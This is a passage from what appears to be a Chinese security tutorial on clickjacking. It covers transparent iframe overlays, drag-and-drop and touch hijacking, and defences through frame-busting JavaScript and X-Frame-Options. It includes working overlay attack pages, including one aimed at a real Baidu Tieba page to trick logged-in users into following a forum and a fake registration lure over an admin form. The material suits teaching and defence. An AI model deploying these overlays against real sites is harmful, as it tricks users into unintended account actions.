<li>拖放劫持：劫持用户的鼠标拖放行为(鼠标拖放行为不受跨域的限制)</li>
<li>触屏劫持：劫持用户触摸屏幕的行为</li>
</ul>
<h3 id="劫持原理"><a href="#劫持原理" class="headerlink" title="劫持原理"></a>劫持原理</h3><p>劫持是通过覆盖一个不可见的框，从原理上来说是一个透明层+iframe，透明层是指页面的透明度为零</p>
<h4 id="透明层使用CSS样式实现"><a href="#透明层使用CSS样式实现" class="headerlink" title="透明层使用CSS样式实现"></a>透明层使用CSS样式实现</h4><p>IE浏览器使用私有的CSS透明属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">filter:alpha(opacity=<span class="number">50</span>) <span class="comment">//数值从0-100，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure>
<p>chrome、Firefox等使用的CSS透明属性如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">opacity:<span class="number">0.5</span> <span class="comment">//数值从0-1，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure>
<p>控件位置之间的层次关系使用z-index，任何浏览器都支持</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">z-index:<span class="number">1</span>   <span class="comment">//数值可以是负数，高数值的控件会低于低数值控件的前面，数值越高，控件越靠近用户</span></span><br></pre></td></tr></table></figure>
<h4 id="使用iframe嵌入被劫持的页面"><a href="#使用iframe嵌入被劫持的页面" class="headerlink" title="使用iframe嵌入被劫持的页面"></a>使用iframe嵌入被劫持的页面</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">"victim"</span> src=<span class="string">"http://www.victim.com"</span> scrolling=<span class="string">"no"</span>&gt;   <span class="comment">//通过页面透明层+iframe实现对用户的视觉欺骗，即用户看到的操作对象和实际的操作对象是不一致的</span></span><br></pre></td></tr></table></figure>
<h3 id="拖放劫持相关"><a href="#拖放劫持相关" class="headerlink" title="拖放劫持相关"></a>拖放劫持相关</h3><blockquote>
<p>由于拖放劫持和触屏劫持实现较负载，这里只了解相关知识</p>
</blockquote>
<h4 id="拖放劫持的思路"><a href="#拖放劫持的思路" class="headerlink" title="拖放劫持的思路"></a>拖放劫持的思路</h4><p>“拖放劫持”的思路是诱使用户从隐藏的不可见iframe中”拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。（突破同源限制）</p>
<h4 id="拖放劫持技术原理"><a href="#拖放劫持技术原理" class="headerlink" title="拖放劫持技术原理"></a>拖放劫持技术原理</h4><p>支持Drag&amp;Drop API</p>
<blockquote>
<p>主流的浏览器都有drag-and-drop API 接口，供网站开发人员创建交互式网页。但是，这些 API 接口在设计时没有考虑很多的安全性问题，导致通过拖拽就可以实现跨域操作。利用拖拽技术，攻击者可以突破很多已有的安全防御措施。</p>
<p>利用拖拽技术，攻击者可以轻易将文本注入到目标网页。在实际实施过程中，攻击者欺骗用户选择输入框的内容，完成拖拽操作。另外一种方式是，通过浏览器的 API 接口将 iframe 中的内容拖拽到目标网页的 text area 中，攻击者就可以获得用户网页中存在的敏感信息。</p>
</blockquote>
<p>dataTransfer对象</p>
<blockquote>
<p>为了能够协助通过拖放操作传递数据，在IE5.0以后引入了dataTransfer对象，他作为event对象的一个属性出现，用于从被拖动的对象传递字符串到放置对象。</p>
<p>dataTransfer对象定义了两个主要方法：getData()和setData().getData操作完成获取由setData所存储的数据。setData操作完成向系统剪贴板中存储需要传递的数据，传递数据分为两种类型：文本数据和URL数据。在HTML5的扩展中，其允许指定任意的MIME类型。有了dataTransfer对象和操作方法后，就为跨域传递数据提供了有效的技术手段</p>
</blockquote>
<h4 id="拖放劫持防御方法"><a href="#拖放劫持防御方法" class="headerlink" title="拖放劫持防御方法"></a>拖放劫持防御方法</h4><p>目前只有FireFox和IE浏览器支持拖放功能，Chrome并不支持拖放功能，所以使用Chrome浏览器可在一定程度上防御拖放攻击；对于IE浏览器来说，不使用ActiveX这类危险组件也可以有效防御拖放攻击。</p>
<h3 id="触屏劫持相关"><a href="#触屏劫持相关" class="headerlink" title="触屏劫持相关"></a>触屏劫持相关</h3><blockquote>
<p>较为复杂，了解相关知识</p>
</blockquote>
<h4 id="触屏劫持防御"><a href="#触屏劫持防御" class="headerlink" title="触屏劫持防御"></a>触屏劫持防御</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、不点击任何不明网站、App上弹出的各种提示信息，例如：手机中病毒需升级杀毒软件等等。最好使用返回键，返回上一级页面，如若恶意跳转，大概率为恶意网站且包含触屏劫持。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">2、苹果手机在使用Safari浏览器的时候，遇到不明情况的提示框或页面，一定要确认地址栏的地址是否隐藏以及是否正确，若网站上含有触屏劫持，则大概率会添加假的地址栏做误导，需谨慎认清。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、安卓手机要多加注意提示框弹出前后，手机系统给出的提示，由于不同安卓手机有很大差别触屏劫持在不同手机上会有不同的效果，但在获取权限时系统都会有好几步的确认工作，所以要多加注意之中细微的差别。</span><br></pre></td></tr></table></figure>
<h3 id="点击劫持技术实现"><a href="#点击劫持技术实现" class="headerlink" title="点击劫持技术实现"></a>点击劫持技术实现</h3><p>构造一个点击页面，上面覆盖一个透明层的iframe，当诱导用户点击时触发iframe中的页面中的login按钮</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;style&gt;</span></span><br><span class="line"><span class="regexp">        #click&#123;</span></span><br><span class="line"><span class="regexp">            width: 100px;</span></span><br><span class="line"><span class="regexp">            top: 20px;</span></span><br><span class="line"><span class="regexp">            left: 20px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">        z-index: 1</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">        #hidden&#123;</span></span><br><span class="line"><span class="regexp">            height: 50px;</span></span><br><span class="line"><span class="regexp">            width: 120px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">            filter: alpha(opacity=50);</span></span><br><span class="line"><span class="regexp">        opacity: 0;</span></span><br><span class="line"><span class="regexp">        z-index: 2</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>style&gt;</span><br><span class="line">    &lt;input id=<span class="string">"click"</span> value=<span class="string">"Click me"</span> type=<span class="string">"button"</span>/&gt;</span><br><span class="line">    &lt;iframe id=<span class="string">"hidden"</span> src=<span class="string">"inner.html"</span> scrolling=<span class="string">"no"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p>inner.html</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;input style="width: 100px;" value="Login" type="button" onclick="alert('clickjacking_test')"/</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p>效果如下</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572083527.72.png" alt></p>
<p>说明：</p>
<p>clickjacking.html是一个用户可见的伪装页面，在其页面中设置iframe所在层为透明层，并在iframe中嵌套了inner.html页面。在clickjacking.html页面中设计了Click me,inner.html中的”login”按钮与其重合，所以在用户点击Click me时实际上点击的是login按钮。</p>
<h3 id="点击劫持实战"><a href="#点击劫持实战" class="headerlink" title="点击劫持实战"></a>点击劫持实战</h3><p>利用点击劫持诱导用户关注贴吧(在百度账户登录的情况下；目标<code>http://tieba.baidu.com/f?kw=%C3%C0%C5%AE</code></p>
<p>抓包测试HTTP响应头是否有 X-Frame-Options字段</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146338.05.png" alt></p>
<p>构造透明层iframe</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">     &lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146436.41.png" alt></p>
<p>修改opacity值为0.3查看覆盖效果</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146499.35.png" alt></p>
<p>可以看到刚好覆盖在关注按钮上，只有用户登录了百度账户，诱导用户点击即可劫持鼠标点击关注</p>
<p>一般这种界面不容易诱导用户，所以要构造好诱导页面；在iframe中加载目标站点时，除了点击劫持还可以进行图片覆盖，有些图片的本来就可以诱导用户，当然也可以点击劫持加图片覆盖结合使用</p>
<p><strong>示例</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
<p>结合刚才的实例一起加载</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0.3;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">          &lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">     &lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146911.11.png" alt></p>
<h3 id="点击劫持实例-防御对比"><a href="#点击劫持实例-防御对比" class="headerlink" title="点击劫持实例+防御对比"></a>点击劫持实例+防御对比</h3><h4 id="情景一：无任何防御"><a href="#情景一：无任何防御" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p>目标页面代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="submit" name="submit" value="提交"&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>效果：模拟的登录界面</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182354.51.png" alt></p>
<p>构造透明层iframe</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="./</span>admin.html<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果：诱导注册<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182435.88.png" alt></p>
<p>后台处理：实际场景中是模拟登录，此处为了方便，弹框即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'username'</span>]) &amp;&amp; isset($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('接收成功')&lt;/script&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('hacked by demos')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('数据不完整')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>诱导点击效果：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182583.03.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182595.7.png" alt></p>
<h4 id="情景二：界面使用JavaScript动态防御"><a href="#情景二：界面使用JavaScript动态防御" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)    <span class="comment">//在应用iframe时top指的是顶级的窗口</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>在网站页面开发加上如上代码，可以动态防御iframe嵌入页面，在检测到有iframe嵌入当前页面时，直接跳转到当前页面，从而防御点击劫持。</p>
<p>本例实现代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="text-align:center;"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="x.php" method="POST"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="username" name="username"&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="submit" name="submit" value="提交"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p>iframe嵌入访问的效果如下：当攻击者诱导用户访问恶意界面时，立即跳转到真正的页面，进行防御</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182966.45.png" alt></p>
<h4 id="情景三：添加X-Frame-Options头"><a href="#情景三：添加X-Frame-Options头" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><blockquote>
<p> 使用该头后禁止页面被iframe嵌套 ,chrome有点问题，不知道为什么，emmm</p>
</blockquote>
<p>修改代码如下</p>
<p>admin.php:禁止一切源嵌入当前页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"X-FRAME-OPTIONS:DENY"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">  body&#123; background-repeat: no-repeat;background-size: <span class="number">100</span>% <span class="number">100</span>%;background-attachment: fixed;&#125;</span><br><span class="line">  h2&#123; color:blue;text-align: center;&#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h2&gt;管理员添加&lt;/h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>攻击者构造的恶意页面</p>
<p>jack.html：opacity改为0.3查看是否嵌套成功</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0.3;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="http:/</span><span class="regexp">/192.168.1.102/</span>clickhack/test2_2/admin.php<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果如下：攻击者没有嵌套成功</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183292.84.png" alt></p>
<p>访问页面抓取数据包查看</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183394.57.png" alt></p>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><blockquote>
<p>最简单的方法：查看目标页面是否可以被iframe嵌套，利用pocbox做演示和上面实例做演示</p>
</blockquote>
<h4 id="情景一：无任何防御-1"><a href="#情景一：无任何防御-1" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183600.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183636.5.png" alt></p>
<h4 id="情景二：界面使用JavaScript动态防御-1"><a href="#情景二：界面使用JavaScript动态防御-1" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183712.82.png" alt></p>
<h4 id="情景三：添加X-Frame-Options头-1"><a href="#情景三：添加X-Frame-Options头-1" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183798.76.png" alt></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>使用JavaScript动态防御</p>
<p>使用一个HTTP头——X-Frame-Options。X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：</p>
<p>DENY：浏览器会拒绝当前页面加载任何frame页面；</p>
